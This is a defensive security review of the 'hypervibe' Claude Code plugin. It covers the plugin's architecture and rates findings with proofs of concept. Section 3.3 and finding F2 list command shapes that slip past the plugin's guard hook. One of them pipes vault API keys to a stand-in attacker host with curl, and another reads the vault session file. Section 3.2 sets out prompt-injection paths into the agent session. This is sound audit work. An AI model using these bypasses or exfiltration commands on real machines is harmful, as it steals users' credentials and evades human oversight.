# Hypervibe plugin: architecture and security review

**Subject:** `hypervibe` Claude Code plugin, v3.4.12. Source is this fork (`NicolasWs/hypervibe-harness`) at commit `984ab56`, which mirrors `flavien-ia/hypervibe-harness`. The fork was not diffed against upstream; this session could only reach the fork.
**Method:** I read the manifests, the hook, the skills, and the scripts and templates they call. I ran the repo's own test suite and wrote small proofs of concept (`analysis/poc/`) for every behavioural claim below. All citations are `path:line` at that commit.
**Files in this folder:**

| File | What it is |
|---|---|
| `README.md` | This report (architecture, lifecycle trace, Mermaid diagram, security assessment, verdict) |
| `architecture.excalidraw` | Editable diagram. Open it at excalidraw.com: *Open* → choose the file |
| `architecture-preview.png` | Static render of the same diagram |
| `poc/*.mjs` | Reproductions. Each one is side-effect free (`node analysis/poc/<file>.mjs` from the repo root) |

---

## 0. The short answer

**Verdict: use with review.** The code is careful, the documentation is unusually candid, and there is no malware, telemetry, obfuscation or install-time code. The plugin does not touch `settings.json`, and its tests pass (764/764 guard checks, every recipe green).

It does, however, put one LLM session in reach of three things at once: untrusted content, every global API key (through an unlocked 12-hour vault session), and unrestricted outbound shell. Several controls are weaker than SECURITY.md says:

1. **44 skills pre-approve unrestricted `Bash`.** SECURITY.md says the plugin "never grants itself permissions". See finding F1.
2. **Any command can exfiltrate any vault key once the vault is unlocked.** The guard does not look at exfiltration, and the session token is written without restrictive file permissions. See F2.
3. **`bootstrap-init.mjs` re-evaluates the project description in a shell.** A backtick or `$(...)` in the description runs as a command. Reproduced. See F3.
4. **`bootstrap-init.mjs` deploys to production, pushes and creates the repository from inside Node,** so the guard never sees it. The README says these actions need confirmation. See F4.
5. **The generated product agent's SSRF guard misses IPv4-mapped IPv6.** Its "read-only, 10 s" SQL tool is neither strictly read-only nor time-limited. See F5.

Details, evidence and fixes are in sections 3 and 4.

---

## 1. Multi-agent architecture map

### 1.1 Headline: this is not a multi-agent system inside Claude Code

The plugin defines **no Claude Code subagents**:

- There is no `agents/` directory (the full file list is in the repo root; `.claude-plugin/plugin.json:1-22` declares nothing beyond metadata).
- No skill uses `context: fork` or `agent:` frontmatter. The frontmatter keys found across all 90 `SKILL.md` files are `name`, `description`, `argument-hint`, `compatibility`, `user-invocable` and `allowed-tools`.
- No skill tells the model to use the Agent/Task tool. A grep for `subagent|Task tool|Agent tool` finds only `run_in_background` for long Bash commands (e.g. `skills/bootstrap/SKILL.md:116,178,785`).

Inside a session, Hypervibe is **one LLM context running a graph of 90 prompt modules (skills)**. The model is both orchestrator and executor. It is fenced by a deterministic policy hook and does real work through roughly 150 deterministic Node scripts. The genuinely separate "agents" are actors the plugin **provisions outside the session**: a scheduled Claude routine, a Cloudflare cron worker, and an LLM agent on Render that is generated into the user's app.

### 1.2 Inventory of actors and roles

| # | Actor / role | Defined in | Kind | Responsibility | Trigger |
|---|---|---|---|---|---|
| A1 | **Claude Code model** (the session) | n/a (host) | LLM | Reads skill prose, chooses and sequences tool calls, writes app code, talks to the user | User message or slash command |
| A2 | **45 public skills** | `skills/<name>/SKILL.md` (e.g. `bootstrap`, `start`, `spec`, `add-*`, `seo`, `geo`, `security`, `delete-project`, `update-hypervibe`) | Prompt module | Workflows the user invokes (`/bootstrap`) or the model picks from the description. None sets `disable-model-invocation`, so the model can load any of them on its own | `/name`, or model auto-selection |
| A3 | **45 internal `_` skills** | `skills/_*/SKILL.md`; 42 set `user-invocable: false` | Prompt module | Shared sub-procedures: `_get-secret` (vault read idiom), `_push-env-vars`, `_track-resource`, `_update-claude-md`, `_dns-*` (11 registrars), `_create-agent`, `_create-routine`, `_create-workflow`, `_create-cloudflare-worker`, `_create-render-worker`, … | Named in another skill's prose |
| A4 | **Guard hook** | `hooks/hooks.json:4-15`, `hooks/guard-bash.mjs:52-78`, `hooks/rules.mjs:1770-2240` | Deterministic policy | Parses every `Bash`/`Monitor` command and returns *deny*, *ask* or nothing | `PreToolUse` on `Bash\|Monitor` |
| A5 | **Node scripts** | `scripts/**` (e.g. `bootstrap-init.mjs`, `setup-db.mjs`, `push-env-vars.mjs`, `vault/*.mjs`, `shared-worker/*.mjs`, `delete-project/*.mjs`) | Deterministic worker | Provisioning, deploys, env-var sync, vault access, audits | Launched by A1 via Bash |
| A6 | **context7 MCP** | `.mcp.json:1-8` | External service | Library documentation over HTTPS | Model tool call |
| A7 | **Shared clock worker** `hypervibe-jobs` | `scripts/shared-worker/worker.js` (1,129 lines), registry in `~/.hypervibe-jobs/` | Deployed code (Cloudflare) | Cron for every project: DB backups, quota watch, pinging project cron routes | Cloudflare cron trigger; `POST /trigger` with `ADMIN_TOKEN` (`worker.js:100-135`) |
| A8 | **Claude routine** | Created by `skills/_create-routine/SKILL.md` | Separate LLM run (user's account) | Operator-facing recurring missions ("brief me every morning") | Cloud or local scheduled task (`_create-routine/SKILL.md:34-40`) |
| A9 | **Generated product agent** | `templates/agent/*` (`loop.ts`, `entry.ts`, `tools/*`) | LLM loop deployed to Render | Agentic tool loop for the user's end-users (`http_fetch`, `send_email`, `db_query`) | node-cron, or polling the `agent_trigger_queue` table (`templates/agent/entry.ts:1-30,80-125`) |
| A10 | **In-app workflows** | `skills/_create-workflow/SKILL.md` | App code on Vercel | Finite 2–8-step AI pipelines inside the generated app | App events |

`skills/add-automation/SKILL.md:31-80` is the router that picks between A7, A8, A9 and A10. Its rules are the "app vs ops" split at `:46-63`, and "finite pipeline → `_create-workflow`, true agent loop → `_create-agent`, operator brief → `_create-routine`" at `:70-80`.

### 1.3 Coordination mechanism

| Question | What the code does | Evidence |
|---|---|---|
| **How are "agents" spawned?** | Skills are not spawned. Their Markdown is loaded into the current context, either by the Skill tool or by the model `Read`ing the file. Bootstrap says so literally: "Read the skill's SKILL.md content and execute the steps described in it as if you were following the instructions yourself." Scripts are spawned as child processes through Bash. Out-of-session actors are deployed: `wrangler deploy` for A7, a scheduled-task tool for A8, the Render API for A9. | `skills/bootstrap/SKILL.md:510-512`; `scripts/shared-worker/_lib.mjs:162-215`; `skills/_create-routine/SKILL.md:94-100` |
| **How do they communicate?** | (a) Shared conversation context: the in-chat checklist is the declared "visible memory". (b) Process interfaces: argv, stdin for secrets, one JSON object on stdout, meaningful exit codes. (c) A log file tailed by a `Monitor`, whose output becomes task notifications. (d) Shared files: `.env`, `CLAUDE.md`, `.vercel/project.json`, `.hypervibe/resources.json`, `cahier-des-charges.md`, `~/.hypervibe-jobs/jobs.js`. (e) The vault: `~/.hypervibe/bw-session` plus the `bw` CLI. (f) At runtime: HTTPS with a bearer `CRON_SECRET` (A7 → site), and a database queue row (dashboard → A9). | (a) `bootstrap/SKILL.md:43-75`; (b) `_get-secret/SKILL.md:46-54`, `vercel/check-deploy.mjs` exit codes at `bootstrap/SKILL.md:116`; (c) `bootstrap/SKILL.md:178-235`; (d) `scripts/manifest/manifest.mjs:2,166`; (e) `scripts/vault/vault.mjs:12-14,40`; (f) `worker.js:202-205`, `templates/agent/schema.ts:75-90` |
| **How are tasks delegated?** | Through prose. A parent skill names the child and the order: bootstrap Step 5 runs `add-db → add-auth → add-email → add-stripe → add-i18n → add-storage → add-analytics → add-map`. Children then name their own helpers (`_ensure-vault`, `_get-secret`, `_push-env-vars`, `_update-claude-md`, `_track-resource`). Nothing enforces the order except the model's compliance and each script's own preflight. | `bootstrap/SKILL.md:508-525`; `add-db/SKILL.md:32-34,94-99,176,352` |
| **How are results merged back?** | There is no merge step. Every result lands in the same context as tool output: stdout JSON and exit codes. Durable results are files: each addon appends to `CLAUDE.md` through `_update-claude-md` and records cloud resources in `.hypervibe/resources.json`, which `/save-project` and `/delete-project` read later. | `bootstrap/SKILL.md:525,935-948` |
| **What constrains the coordinator?** | Only the guard hook (A4) and the scripts' own checks (for example `run-sql.mjs` and `execute-deletions.mjs`). Everything else is instructions to the model. | `hooks/guard-bash.mjs:17-22`; `SECURITY.md:122-134` |

### 1.4 End-to-end lifecycle of one task: `/bootstrap "restaurant site with reservations"`

| Step | What happens | Agent / medium | Evidence |
|---|---|---|---|
| 0 | User types `/bootstrap …`. Claude Code injects `skills/bootstrap/SKILL.md`, which has no `allowed-tools`, so nothing is pre-approved at this level. | A1 ← A2, skill load | `skills/bootstrap/SKILL.md:1-6` |
| 1 | The model asks for the name and a ~150-character description in plain chat, then prints the 8-step checklist. | A1 ↔ user | `bootstrap/SKILL.md:81-99, 43-58` |
| 2a | It picks the parent folder by running `detect-projects-dir.mjs` (JSON out) and guards the name with `check-name-collision.mjs`. Each Bash call first goes through the guard. | A1 → Bash → A4 → A5 | `bootstrap/SKILL.md:130,162`; `hooks/hooks.json:4-15` → `hooks/guard-bash.mjs:52-70` → `rules.mjs:1770` |
| 2b | It launches `bootstrap-init.mjs --name … --description …` in the background, logging to `$LOG_FILE`. | A1 → Bash (background) → A5 | `bootstrap/SKILL.md:180-189` |
| 2c | A `Monitor` loop greps the log for `▸ [A-Z]` step lines and the 🎉/❌ banners. Each new line wakes the model as a task notification. | A5 → file → Monitor → A1 | `bootstrap/SKILL.md:197-235`; banner at `scripts/bootstrap-init.mjs:1689` |
| 2d | Inside the script, 25 sequential steps run (`bootstrap-init.mjs:1660-1684`): T3 scaffold, `seo` (re-shells the description, `:946-955`; see F3), `claudeMdCore` (writes the project `CLAUDE.md`, `:987-1000`), `commit` (`git add -A`, `:1166-1180`), `ghRepo` (`gh repo create … --push`, `:1184-1190`), `vercelLink`, `pushEnvVars`, `deploy` (`vercel --prod --yes`, `:1436-1450`), `smokeTest` (HTTP GET of the live URL, `:1473+`), `verifyAutoDeploy` (empty commit + `git push`, `:1547-1559`). All of it goes through `run()`, which is `spawnSync(cmdStr, {shell: true})` (`:292-310`). The guard sees none of these inner commands (see F4). | A5 → provider CLIs / HTTPS | as cited |
| 3–4 | It repairs warnings, then asks spec mode A/B/C. Mode A loads the `spec` skill into context and produces `cahier-des-charges.md`. Mode B reads a user-supplied `.md` file, which is untrusted input to the planner. | A1 ↔ user, A2 | `bootstrap/SKILL.md:414-466` (spec at `:426`) |
| 5 | Addons run in order. `add-db`: vault preflight (`add-db/SKILL.md:32-34`), key presence check (`:94-99`), `setup-db.mjs` (`:176`). The script reads `NEON.api_key` from the vault (`scripts/setup-db.mjs:58-67`), provisions Neon over REST, runs a schema-drift check before `drizzle-kit push --force` (`setup-db.mjs:434-457`), pushes `DATABASE_URL` over stdin via `_push-env-vars`, updates `CLAUDE.md`, and records the resource (`add-db/SKILL.md:352`). | A1 → A3 → A5 → vault + Neon + Vercel | as cited |
| 6 | The model writes the application with Edit/Write, committing each section by named files. | A1 → files → git | `bootstrap/SKILL.md:625-630` |
| 7–8 | Legal pages and final audit. Then `git push`, where the guard rule at `rules.mjs:1931-1937` asks the user, followed by `check-deploy.mjs --sha …` until `READY`, and the "🎉 BOOTSTRAP COMPLETE" banner. | A1 → A4 → user; A5 → Vercel | `bootstrap/SKILL.md:774-800` |

**Cross-check with the repo's own artifacts.** `README.md:50-66` and `README.md:121-123` describe the same flow: skills read and executed, internal `_` helpers "invoked automatically by the public skills". `RELEASE.md:263-267` states that `node scripts/tests/run-all.mjs` gates every release. I ran it: all recipes pass, and `hooks/test-hooks.mjs` reports 764/764. There is **no CI configuration** in the repo (no `.github/`). Tests run only on the maintainer's machine (`RELEASE.md:316`).

---

## 2. Diagram

The editable version is `analysis/architecture.excalidraw` (19 numbered edges, the same numbering as the table below); `analysis/architecture-preview.png` is a static render. The Mermaid version below renders inline on GitHub.

```mermaid
flowchart LR
  classDef human fill:#ffec99,stroke:#e67700,color:#000
  classDef llm fill:#d0bfff,stroke:#6741d9,color:#000
  classDef code fill:#a5d8ff,stroke:#1971c2,color:#000
  classDef policy fill:#ffc9c9,stroke:#c92a2a,color:#000
  classDef state fill:#b2f2bb,stroke:#2f9e44,color:#000
  classDef ext fill:#e9ecef,stroke:#495057,color:#000
  classDef untrusted fill:#ffd8a8,stroke:#d9480f,color:#000

  USER["Human user<br/>(Claude Code CLI / desktop)"]:::human
  WEB["Untrusted content<br/>web pages, spec .md, repos, API replies"]:::untrusted
  CTX7["context7 MCP (HTTP)"]:::ext

  subgraph SESSION["Claude Code session: ONE LLM context, no subagents"]
    CLAUDE["Claude Code model<br/>orchestrator AND executor"]:::llm
    PUB["45 public skills<br/>/bootstrap /start /add-* /seo ..."]:::llm
    INT["45 internal _skills<br/>_get-secret _push-env-vars _create-agent ..."]:::llm
    BASH["Bash / Monitor tool<br/>44 skills pre-approve bare Bash"]:::code
    GUARD["PreToolUse guard<br/>guard-bash.mjs + rules.mjs<br/>denylist, fail-open"]:::policy
  end

  SCRIPTS["~150 Node scripts<br/>bootstrap-init, setup-*, push-env-vars, shared-worker/*"]:::code
  FILES["Local state<br/>.env, CLAUDE.md, .vercel/, .hypervibe/resources.json,<br/>~/.claude/CLAUDE.md, ~/.hypervibe-jobs/"]:::state
  VAULT["Bitwarden vault<br/>session ~/.hypervibe/bw-session (12 h)"]:::state
  CLOUD["Provider CLIs / APIs<br/>gh, vercel, wrangler, Neon, Cloudflare, Render, Stripe, mail"]:::ext

  subgraph RUNTIME["Out-of-session actors the plugin provisions"]
    SHARED["Shared CF worker hypervibe-jobs<br/>account-level keys"]:::code
    ROUTINE["Claude routine<br/>scheduled Claude run"]:::llm
    AGENT["Generated product agent (Render)<br/>http_fetch, send_email, db_query"]:::llm
    SITE["Generated project site (Vercel)<br/>+ in-app workflows"]:::code
  end
  OPENROUTER["OpenRouter LLM API"]:::ext

  USER -- "1 chat / slash command" --> CLAUDE
  CLAUDE -- "2 Skill tool or Read SKILL.md" --> PUB
  PUB -- "3 prose: invoke _x (same context)" --> INT
  CLAUDE -- "4 tool call" --> BASH
  BASH -- "5 PreToolUse JSON on stdin" --> GUARD
  GUARD -. "6 permission prompt (ask) / deny" .-> USER
  BASH -- "7 argv + stdin / stdout JSON + exit code" --> SCRIPTS
  SCRIPTS -- "8 bw get (BW_SESSION from file)" --> VAULT
  SCRIPTS -- "9 HTTPS REST / CLI spawn" --> CLOUD
  SCRIPTS -- "10 fs writes" --> FILES
  FILES -- "11 Read tool / CLAUDE.md autoload" --> CLAUDE
  WEB -. "12 WebFetch / curl output (untrusted)" .-> CLAUDE
  CTX7 -- "13 MCP over HTTP" --> CLAUDE
  CLOUD -- "14 wrangler deploy + secret put (stdin)" --> SHARED
  SHARED -- "15 HTTPS POST + Bearer CRON_SECRET" --> SITE
  INT -- "16 _create-routine: scheduled-task tool" --> ROUTINE
  CLOUD -- "17 git push → Vercel build" --> SITE
  SITE -- "18 row in agent_trigger_queue (polled)" --> AGENT
  AGENT -- "19 HTTPS chat + tool calls" --> OPENROUTER
```

**Legend**

| Colour | Meaning |
|---|---|
| Yellow | Human |
| Violet | LLM-driven actor, or a prompt layer the LLM executes |
| Blue | Deterministic code |
| Red | Policy gate |
| Green | State / secrets at rest |
| Grey | External service |
| Orange | Untrusted input |
| Dashed red edge | Untrusted data flow, or the human approval gate |

| Edge | Medium | Evidence |
|---|---|---|
| 1 | Chat / slash command | host |
| 2 | Skill tool, or `Read` of the `SKILL.md` file (text into context) | `bootstrap/SKILL.md:510-512` |
| 3 | Prose reference; same context, not a subagent | `bootstrap/SKILL.md:508-525` |
| 4 | Tool call | host |
| 5 | Hook process; JSON on stdin, decision JSON on stdout | `hooks/guard-bash.mjs:11-15,52-70` |
| 6 | Host permission prompt | `hooks/guard-bash.mjs:61-69` |
| 7 | Process argv / stdin / stdout / exit code | `_get-secret/SKILL.md:46-67` |
| 8 | `bw` CLI with `BW_SESSION` read from a file | `scripts/vault/vault.mjs:40,68-75,96-115` |
| 9 | HTTPS / CLI spawn | `scripts/_spawn.mjs:59-70`; `bootstrap-init.mjs:292-310` |
| 10 | Filesystem | `scripts/manifest/manifest.mjs:166`; `scripts/update-global-claude-md.mjs:71` |
| 11 | `Read` tool, and Claude Code's `CLAUDE.md` autoload | `scripts/rules/rules.mjs:1-30` |
| 12 | WebFetch / curl output (untrusted) | e.g. `scripts/seo/live-check.mjs`, `scripts/geo/fetch-as-ai.mjs` |
| 13 | MCP over HTTP | `.mcp.json:3-6` |
| 14 | `wrangler deploy` and `secret put` (value on stdin) | `scripts/shared-worker/_lib.mjs:162-215` |
| 15 | HTTPS + bearer `CRON_SECRET` | `scripts/shared-worker/worker.js:202-205` |
| 16 | Scheduled-task tool | `skills/_create-routine/SKILL.md:34-40,94-100` |
| 17 | Git push → Vercel integration | `bootstrap-init.mjs:1547-1559` |
| 18 | Database queue row (polled) | `templates/agent/entry.ts:80-125` |
| 19 | HTTPS chat + tools | `templates/agent/ai.ts`, `templates/agent/loop.ts:165-175` |

---

## 3. Security assessment

### 3.1 Inventory of capability sites

**Shell execution.** 51 non-test files contain `shell: true`, `execSync` or `exec(`.

| Pattern | Where | Notes |
|---|---|---|
| Argv-safe launchers | `scripts/_spawn.mjs:48-70` (`runNode`, `runCli`, `spawnSpec`) | Good: no shell on POSIX; quoted single string on Windows |
| String + `shell: true` | `bootstrap-init.mjs:292-299` (`run`), `:931-935` (`runSibling`); `setup-db.mjs:192-199,444-457`; `setup-auth-users.mjs:136,365-369`; `setup-auth-admin.mjs:142`; `setup-2fa.mjs:90`; `setup-role.mjs:155`; `setup-agent.mjs:189`; `setup-agent-dashboard.mjs:116`; `setup-email.mjs:191`; `push-env-vars.mjs:509-524`; `neon/schema-drift.mjs:317-322`; `check-deps.mjs:110`; `ensure-hooks-chain.mjs:92,139`; `vault/install-bw.mjs:114,140,158-167`; `_write-user-env.mjs:68`; `setup-gitleaks-global.mjs:59,216,415`; `audit-clis.mjs:35`; `shared-worker/_lib.mjs:172,179`; `vercel/check-deploy.mjs:111,178`; `repair-lint.mjs:77`; `_pnpm-workspace.mjs:78`; `setup-map.mjs:163`; `ensure-pnpm-globalbin.mjs:24` | Mostly constant strings, or paths the code builds itself. **Exception: free text reaches a shell in `bootstrap-init.mjs:946-955` (F3).** `push-env-vars.mjs` quotes the key with `escapeArg` (`:504-507`) and sends values on stdin |
| Installers | `skills/start/SKILL.md:102` (winget msixbundle via PowerShell `-ExecutionPolicy Bypass`), `:132` (official Homebrew `curl \| bash`), `:125,149` (`npm i -g pnpm`); `vault/install-bw.mjs:70-167` (Bitwarden CLI; redirect pinned to the official release, **no checksum**, Unix path marked "TODO … untested" at `:151-152`); `setup-gitleaks-global.mjs:179-203` (checksum-verified) | Disclosed in `SECURITY.md:38-61` |
| pnpm build scripts | `bootstrap-init.mjs:427` sets `--config.dangerously-allow-all-builds=true` on pnpm 11 | Re-enables every dependency's postinstall script in new projects, overriding pnpm 11's protective default |

**Dynamic code evaluation.** There is no `eval`, `new Function` or `vm`. Every dynamic `import()` loads a path the code builds itself: `vercel-github-app.mjs:83,92`, `render/*.mjs` (the vault module), and `r2-check.mjs:99` / `save-project/dump-db.mjs:64` (packages resolved from the project's own `node_modules`). Separately, the shared worker's registry is written as a JS module from `JSON.stringify` (`shared-worker/_lib.mjs:93`) and deployed. That is data serialised as code, so it is safe as long as it stays JSON.

**Filesystem writes outside the project workspace**

| Path | Writer | Content |
|---|---|---|
| `~/.claude/CLAUDE.md` (managed block) | `scripts/update-global-claude-md.mjs:71` | Rules loaded into every Claude Code session on the machine (`scripts/rules/rules.mjs:31-80`) |
| `~/.hypervibe/bw-session` | `scripts/vault/interactive.mjs:269-270` | Vault session token. **No `mode`** (F2) |
| `~/.hypervibe/bin`, `bw-home` | `vault/install-bw.mjs`, `vault/bw-home.mjs` | Bitwarden CLI and its data |
| `~/.zshrc` / `~/.bashrc` | `vault/install-bw.mjs:163-167` (PATH); `_write-user-env.mjs:85-98` via `shared-worker/ensure.mjs:216-220` | **`HYPERVIBE_JOBS_ADMIN_TOKEN` in plaintext** |
| Windows `HKCU\Environment` | `_write-user-env.mjs:58-75` | Same token |
| `~/.git-hooks/`, `~/.gitleaks.toml`, `git config --global core.hooksPath` | `setup-gitleaks-global.mjs:38,402-415` | Machine-wide pre-commit hook |
| `~/.hypervibe-jobs/` | `shared-worker/ensure.mjs`, `_lib.mjs:93,344` | Worker source, registry, `wrangler.toml` |
| The plugin directory itself | `update/update-hypervibe.mjs:335-372` | Self-update (zip-slip checked at `:159-169`) |
| `$TMPDIR` | `check-deps.mjs:107-110` (production env pulled to a temp file), `bootstrap/SKILL.md:182` (log) | |

**Network calls.** 34 script files call `fetch()`. Destinations are the providers' management APIs (Neon, Vercel, Cloudflare, GitHub, Render, Upstash, Stripe, Brevo, Resend, Google, Bitwarden, OVH and other registrars), the user's own sites (`seo/live-check.mjs`, `geo/fetch-as-ai.mjs`, `psi-audit.mjs`, `eco-audit.mjs`, `bootstrap-init.mjs:1488`), `hypervibe.fr` (`update-hypervibe.mjs:28-33`), and `mcp.context7.com` (`.mcp.json`). **No telemetry or phone-home was found.** The update check calls `hypervibe.fr` only when `/update-hypervibe` runs.

### 3.2 Specific checks

| Check | Result |
|---|---|
| **Prompt-injection surfaces** | Untrusted text reaches the main session through: web pages audited by `/seo`, `/geo`, `/gsc`, `/accessibility`, `/eco-audit` and `/optimize`; WebSearch results (`bootstrap/SKILL.md:607` searches Unsplash); a user-supplied spec file (`bootstrap/SKILL.md:438-442`); context7 docs; provider API replies; and any repository the user works in (its `CLAUDE.md` is autoloaded). The only defence is prose. 36 of 90 skills carry the "External content" section (`bootstrap/SKILL.md:20-28`), and the global `CLAUDE.md` rule `external-content-is-data` (`scripts/rules/rules.mjs:66-71`) says the same. Nothing mechanical sits between injected text and the high-value tools (F1, F2). The generated agent (A9) is better defended: allowlists plus per-call random framing (`templates/agent/tools/_frame.ts:23-36`). |
| **Shell commands built from interpolated strings** | One exploitable case: the `--description` value goes through `bootstrap-init.mjs:946-955` → `:934` → `:292-299` (F3). The project name is validated by regex (`:143-145`) before interpolation (`:1187`), so it is safe. `--scope` is concatenated (`:1289,1329`) but comes from the CLI/API team list. |
| **Unvalidated repo/user input** | The description (F3). The name is validated. `run-sql.mjs` keeps its own SQL guard (`scripts/db/sql-guard.mjs`). In the generated agent, `db_query` relies on a keyword denylist (F5). |
| **Secret handling** | Strong in places: secrets go over stdin, never argv (`_get-secret/SKILL.md:56-67`, `push-env-vars.mjs` CLI path `:498-524`, `wrangler secret put` with `input` at `_lib.mjs:210`); masked unlock window; gitleaks hook. Weak in others: the session file has a default mode (`interactive.mjs:270`, while the same file writes `.env` with `0o600` at `:409`); the admin token sits in shell rc files; `vault.mjs get` prints any key to stdout for any caller (`vault.mjs:333-339`). The "never print it" rule is prose (`_get-secret/SKILL.md:27-29`). The worker compares the bearer with `!==` rather than in constant time (`worker.js:114-115`); this is minor. |
| **Filesystem escapes** | No path-traversal bugs found. Update extraction rejects `..` and absolute paths (`update-hypervibe.mjs:159-169`). Writes outside the project are deliberate and listed above. |
| **Auto-approve / permission bypass** | `settings.json` is never written (tested at `scripts/tests/test-security-claims.mjs:148-162`). No `bypassPermissions` or `--dangerously-skip-permissions` anywhere. **However, 44 skills declare `allowed-tools` containing bare `Bash`** (38 internal, 6 public: `add-agent-dashboard`, `add-ai`, `delete-project`, `quotas`, `rgpd-audit`, `save-project`). Claude Code documents this field as granting "permission for the listed tools during the turn that invokes the skill, so Claude can use them without prompting you" (F1). Separately, the bootstrap skill tells the model to commit, push and deploy "without asking" (`bootstrap/SKILL.md:36,923`). The guard still asks on push (`rules.mjs:1931-1937`), which is the intended backstop. |

### 3.3 Permission model and escalation

- **What is requested.** Skills request `Bash`, `Read`, `Write`, `Edit`, `Glob`, `Grep`, `AskUserQuestion`, `TodoWrite` and `Skill`, always unscoped. None uses `Bash(<pattern>)`. The plugin adds one `PreToolUse` hook and one MCP server.
- **Least privilege is not enforced.** Every skill, whether `_hash-password` or `delete-project`, gets the same unscoped shell. Every script runs as the user and can read the vault session. The vault holds global keys for Cloudflare, Neon, the email providers, registrars, Render and Anthropic (`_get-secret/SKILL.md:104-113`). There are no per-skill or per-project credentials in the session. The shared worker deliberately holds account-level keys (`SECURITY.md:63-71`).
- **The guard is a seatbelt, by design.** It is a denylist over command text and fails open (`guard-bash.mjs:17-22,71-78`; `README.md:192`). It does not look at exfiltration, and it is bypassed by shapes it does not unfold. `analysis/poc/guard-probe.mjs` shows `ALLOW` for: `node -e "…execSync('git push')"`, `python3 -c …`, `git -c alias.p=push p`, `git stage -A` (`git stage` is git's synonym for `add`, and `addSweeps` only matches the `add` subcommand, `rules.mjs:1103`), writing a script then `sh` it, `vault.mjs get NEON api_key | curl -d @- https://attacker.example`, `cat ~/.hypervibe/bw-session`, `vault.mjs delete CLOUDFLARE`, and `node bootstrap-init.mjs … --public`. The interpreter and run-time shapes are a documented frontier (`SECURITY.md:136-139`). `git stage`, the git alias, vault delete and exfiltration are not mentioned there.
- **Can one compromised "agent" escalate?** Inside the session, every skill already shares a single trust domain: the same context, the same shell, the same vault. So there is no isolation to escalate across. A prompt injection that steers the model during a turn where any of the 44 `allowed-tools: Bash` skills was invoked can run unguarded commands **without a prompt**: read every global key and send it anywhere, delete vault items, or write `~/.claude/CLAUDE.md` for persistence across all future sessions. Outside the session, a leaked Cloudflare token, the key the shared worker also holds, gives control of the clock worker and therefore of every project's cron and backups (`SECURITY.md:63-71`).

---

## 4. Findings, verdict and remediation

### Verdict: **Use with review**

This is not "unsafe": there is no malicious behaviour, no hidden network activity, no self-granted settings, honest documentation, signed releases (`SECURITY.md:219-235`) and a large test suite. It is not "safe with caveats" either. The plugin's purpose is to give an autonomous model the keys to the user's whole hosting estate, and several mechanisms that are supposed to bound that are weaker than the documentation states. Install it on a single-user machine, for people who will read the prompts, after applying R1–R3 locally or waiting for upstream fixes.

### Top findings (ordered by severity)

| ID | Severity | Finding | Evidence | Confirmed how |
|---|---|---|---|---|
| **F1** | High | **44 skills pre-approve unrestricted `Bash`, contradicting "The plugin never grants itself permissions".** While one of them is the invoking skill, any unguarded shell command (exfiltration, vault reads, writing `~/.claude/CLAUDE.md`) runs without a user prompt. The repo's own test labels these skills as ones that "explicitly restrict their tools", the opposite of what the field does. | `skills/_collect-secret/SKILL.md:5`, `skills/delete-project/SKILL.md:4`, `skills/quotas/SKILL.md:4` (+41 more, list via `grep -n '^allowed-tools' skills/*/SKILL.md`); `SECURITY.md:24-27`; `scripts/tests/test-security-claims.mjs:144-145,728-731` | Frontmatter read; field semantics taken from the current Claude Code skills docs ("grants permission for the listed tools during the turn that invokes the skill … without prompting you") |
| **F2** | High | **Every global key can be exfiltrated by any command once the vault is unlocked (12 h).** `vault.mjs get` prints any item to stdout. The session token file is written without `mode: 0o600`, so it inherits the umask (typically 0644 under a 0755 `~/.hypervibe`). The guard has no exfiltration or vault rules. Combined with the injection surfaces in 3.2, this is the "lethal trifecta" SECURITY.md itself describes for the generated agent, here present in the operator session. | `scripts/vault/vault.mjs:40,333-339`; `scripts/vault/interactive.mjs:269-270` (contrast `:409`); `hooks/rules.mjs:1770-2240` (no vault/exfil rule) | `poc/guard-probe.mjs`: `vault.mjs get NEON api_key \| curl -d @- …` → ALLOW, `cat ~/.hypervibe/bw-session` → ALLOW |
| **F3** | Medium | **Shell command injection through the project description.** `seo()` wraps the description in double quotes and `run()` spawns it with `shell: true`. `$(...)`, backticks and `$VAR` are still evaluated. Ordinary text breaks it too: "save \`todo\` items" runs `todo`, and "from $5" loses `$5`. The source is the user's Step 1 answer, possibly rephrased by the model, so the realistic risk is accidental execution and silent corruption of the SEO description. A crafted description would be needed for anything worse. | `scripts/bootstrap-init.mjs:946-955`, `:931-935`, `:292-299` | `poc/description-injection.mjs`: both payloads execute; the child receives `"A todo app  that saves  you"` |
| **F4** | Medium | **Production deploy, push, public-repo creation and a sweeping `git add -A` all run inside `bootstrap-init.mjs`, invisible to the guard.** The README table promises confirmation for `vercel --prod` and `git push`. `rules.mjs` asks for other plugin scripts that deploy (`ensure.mjs`, `register.mjs`, `execute-deletions.mjs`), but has no rule for this one. `--public` passes too. Mitigation: the user invoked `/bootstrap` and the repository is new. Still, the documented guarantee does not hold on this path. | `bootstrap-init.mjs:1168,1184-1190,1442,1555-1559`; `README.md:169-172`; `rules.mjs:2026` (pattern used for `execute-deletions`) | `poc/guard-probe.mjs`: `node scripts/bootstrap-init.mjs … --public` → ALLOW |
| **F5** | Medium (in generated code) | **Generated product agent: SSRF guard bypass, and a `db_query` that is neither read-only nor time-limited.** (a) `isBlockedIp` only recognises dotted IPv4. WHATWG `URL` rewrites `[::ffff:127.0.0.1]` to `::ffff:7f00:1`, which passes, and so does the cloud-metadata address `::ffff:a9fe:a9fe`. (b) The 10 s `AbortController` is never passed to `db.execute`, so `pg_sleep(600)` runs. (c) The keyword denylist accepts side-effecting `SELECT`s (`setval`, `pg_terminate_backend`, `pg_advisory_lock`), and the connection uses the app's full-privilege `DATABASE_URL`. These ship into every agent `/add-automation` scaffolds, the exact component SECURITY.md:155-174 presents as fenced. | `templates/agent/tools/http-fetch.ts:60-75,101`; `templates/agent/tools/db-query.ts:51-79,88-89,98` | `poc/ssrf-mapped-ipv6.mjs` (classification confirmed; **actual connection not verified here**, as this container has no IPv6 stack); `poc/db-query-readonly.mjs` |

### Lower-severity findings

| ID | Finding | Evidence |
|---|---|---|
| L1 | **Self-update integrity fails open, and the check is same-origin.** If the manifest is unreachable or reports another version, the archive installs unverified (`sha256Verified: false`). The tag signature is never checked by the updater. This only applies to manual installs; marketplace installs defer to Claude Code (`:312-320`). SECURITY.md says it "refuses to install on a mismatch", which is true but omits the fail-open path. | `scripts/update/update-hypervibe.mjs:255-293`; `SECURITY.md:208-214` |
| L2 | **The shared-worker admin token is persisted in plaintext** in `~/.zshrc`/`~/.bashrc` or the registry, against `SECURITY.md:178-180` ("never written to a file"). Impact is limited: it gates `/status` and `/trigger` only. | `_write-user-env.mjs:85-98`; `shared-worker/ensure.mjs:216-220`; `worker.js:100-135` |
